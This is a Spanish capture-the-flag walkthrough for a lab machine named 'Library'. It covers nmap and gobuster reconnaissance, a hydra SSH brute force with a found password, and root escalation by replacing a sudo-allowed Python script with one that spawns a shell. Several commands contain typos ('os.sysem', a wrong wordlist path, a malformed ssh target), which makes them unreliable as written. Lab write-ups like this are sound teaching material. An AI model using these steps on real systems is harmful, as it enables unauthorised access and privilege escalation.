Maquina: Library

Autor: El Pinguino de Mario

Dificultad: Facil

ping 172.17.0.2 -c 1

Vamos a iniciar nuestro reconocimiento con un rápido escaneo de nmap

nmap -p- --open -sS -sC -sV --min-rate=5000 -vvv -n -Pn -oN escaneo 172.17.0.2

La pagina web no muestra nada 

Usamos Gobuster para hacer un reconocimiento web y ver que directorios podemos encontrar en dicho sitio

gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php

Gobuster ha encontrado un index.php

Tenemos una posible contraseña

Vamos hacer fuerza bruta con hydra al protocolo ssh pasandole un diccionario de usuarios

hydra -L /usr/sharewrodlists/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD ssh://172.17.0.2

Encontramos el usuario Carlos vamos a ingresar al SSH

ssh carlos"172.17.0.2

ejecutamos el comando sudo -l para ver si tenemos premisos especiales

Vamos al directorio y listamos para ver los permisos

cd /opt
ls -la

Lo que podemos hacer es eliminar el archivo y crear otro con el mismo nombre pero que un su interior tenga lo siguiente

nano scrip.py

import os

os.sysem("/bin/sh")

ejecutamos la script con sudo

sudo /usr/bin/python3 /opt/script.py

whoami
